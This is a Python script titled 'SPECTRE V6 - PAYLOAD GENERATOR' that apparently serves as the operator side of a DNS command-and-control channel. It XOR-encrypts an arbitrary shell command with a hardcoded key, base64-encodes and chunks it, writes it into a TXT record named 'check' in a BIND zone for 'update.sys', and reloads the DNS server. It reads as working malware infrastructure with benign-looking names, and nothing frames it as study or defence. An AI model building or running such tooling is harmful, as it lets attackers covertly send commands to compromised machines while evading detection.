#!/usr/bin/env python3
import base64
import sys
import re
import os
import subprocess  # <--- Added to run system commands

MASTER_KEY = "PA8_PLATINUM_KEY_2025" 

# --- CONFIGURATION ---
ZONE_FILE_PATH = "/etc/bind/db.update.sys"
RECORD_NAME = "check"
# ---------------------

def encrypt(data):
    if isinstance(data, str): data = data.encode('utf-8')
    data = bytearray(data)
    key_len = len(MASTER_KEY)
    for i in range(len(data)):
        data[i] ^= (ord(MASTER_KEY[i % key_len]) ^ (i & 0xFF))
    return bytes(data)

def split_chunks(b64_str):
    chunk_size = 255
    if len(b64_str) <= chunk_size: return [b64_str]
    return [b64_str[i:i+chunk_size] for i in range(0, len(b64_str), chunk_size)]

def format_bind(chunks):
    if len(chunks) == 1: return f'"{chunks[0]}"'
    formatted = "(\n"
    for chunk in chunks: formatted += f'    "{chunk}"\n'
    formatted += ")"
    return formatted

def update_zone_file(formatted_payload):
    if not os.path.exists(ZONE_FILE_PATH):
        print(f"ERROR: File {ZONE_FILE_PATH} not found.")
        return False  # Return False if failed

    try:
        with open(ZONE_FILE_PATH, 'r') as f:
            content = f.read()

        pattern = re.compile(
            rf'({RECORD_NAME}\s+IN\s+TXT\s+\()([\s\S]*?)(\))', 
            re.MULTILINE
        )

        new_record = f"{RECORD_NAME}    IN    TXT    {formatted_payload}"

        if pattern.search(content):
            print(f"[*] Updating existing '{RECORD_NAME}' record in {ZONE_FILE_PATH}...")
            new_content = pattern.sub(f"{RECORD_NAME}    IN    TXT    {formatted_payload}", content)
        else:
            print(f"[*] Record '{RECORD_NAME}' not found. Appending to {ZONE_FILE_PATH}...")
            new_content = content + "\n" + new_record + "\n"

        with open(ZONE_FILE_PATH, 'w') as f:
            f.write(new_content)
        
        print("[+] File updated successfully.")
        return True # Return True if successful
        
    except PermissionError:
        print(f"ERROR: Permission denied. Try running with sudo.")
        return False
    except Exception as e:
        print(f"ERROR: Could not update file. {e}")
        return False

# --- NEW FUNCTION TO RELOAD BIND ---
def reload_bind():
    print("[*] Reloading BIND service...")
    try:
        # Method 1: The "Soft" reload (Recommended)
        # This reloads zone files without stopping the server
        subprocess.run(["rndc", "reload"], check=True)
        print("[+] BIND reloaded via rndc.")
    except (subprocess.CalledProcessError, FileNotFoundError):
        try:
            # Method 2: Systemctl reload (Fallback)
            # Adjust 'bind9' to 'named' if on CentOS/RHEL
            subprocess.run(["systemctl", "reload", "bind9"], check=True)
            print("[+] BIND reloaded via systemctl.")
        except Exception as e:
            print(f"[-] WARNING: Failed to reload BIND. You must do it manually.\nError: {e}")
# -----------------------------------

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} 'command'")
        sys.exit(1)
    
    # Auto-test
    test_val = b"TEST"
    if encrypt(encrypt(test_val)) != test_val:
        print("ERROR: Crypto broken"); sys.exit(1)
        
    cmd = sys.argv[1]
    encrypted = encrypt(cmd)
    b64 = base64.b64encode(encrypted).decode('utf-8')
    chunks = split_chunks(b64)
    
    formatted_payload = format_bind(chunks)

    print("\n" + "="*50)
    print("SPECTRE V6 - PAYLOAD GENERATOR")
    print("="*50)
    print(f"Command Size: {len(cmd)} chars")
    print(f"DNS Payload:  {len(chunks)} chunks (Total {len(b64)} chars)")
    
    # Trigger the file update, AND if successful, reload the server
    if update_zone_file(formatted_payload):
        reload_bind()
